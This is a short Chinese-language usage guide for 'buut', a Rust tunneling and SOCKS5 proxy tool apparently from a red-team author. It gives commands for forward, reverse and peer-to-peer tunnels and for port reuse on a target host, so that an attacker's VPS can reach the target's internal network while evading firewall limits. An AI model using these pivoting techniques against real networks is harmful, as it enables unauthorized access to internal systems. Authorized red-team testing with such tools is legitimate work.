Buut

这是一款TRX红队大哥使用rust语言开发的代理工具

下载地址：https://github.com/YDHCUI/buut

使用方法

正向隧道

客户端使用参数监听 4433 端口

[root@localhost]# ./buut -F -l 4433

服务端连接客户端监听的 4433 端口

[root@localhost]# ./buut -F -s 192.168.3.1:4433

VPS 使用 -F 参数和 -s 参数连接目标监听的 4433 端口，连接成功会在本地开放一个 10086 端口

此时 Hacker 通过连接 VPS 的 10086 端口就相当于进入到目标主机的网络环境

正向的缺点就是目标的防火墙可能会限制入行，就会出现访问不到目标的 4433 端口情况

反向隧道

首先 VPS 监听自己的 4433 端口

[root@localhost]# ./buut -l 4433

目标主机连接 VPS 监听的 4433 端口

[root@localhost]# ./buut -s 192.168.3.1:4433

连接 VPS 的 4433 端口，此时 VPS 收到来自目标服务器的连接，并且在本地开启一个 10086 端口

Hacker 连接 VPS 的 10086 端口就可以进入到目标主机的网络环境

点对点隧道

在 VPS 监听 10087 端口

[root@localhost]# ./buut -F -S -l 10087

此时直接连接 VPS 的 10087 端口，就进入到了 VPS 的网络环境

端口复用

端口复用的原理本质是使用不同的网卡去监听同一个端口。

在目标主机开启端口复用，通过 IP 来指定对应网卡 同时把非 buut 流量转发给 127.0.0.1 对应的网卡

buut.x86_64-pc-windows-msvc.exe -F -X -l 172.20.10.7:80 -f 127.0.0.1:80

VPS 进行连接

buut.x86_64-pc-windows-msvc.exe -F -s 172.20.10.7:80

此时成功连接到 80 端口并且在本地打开 10086 作为 socks5 端口，用户和密码为 buut

这个复用需要看实际情况，需要被复用的程序也实现了 so_reuseport

例如 Windows 的 Nginx 可以，Linux 有些版本 Nginx 可以，其他的中间件或者程序是否能够复用需要自行去尝试。
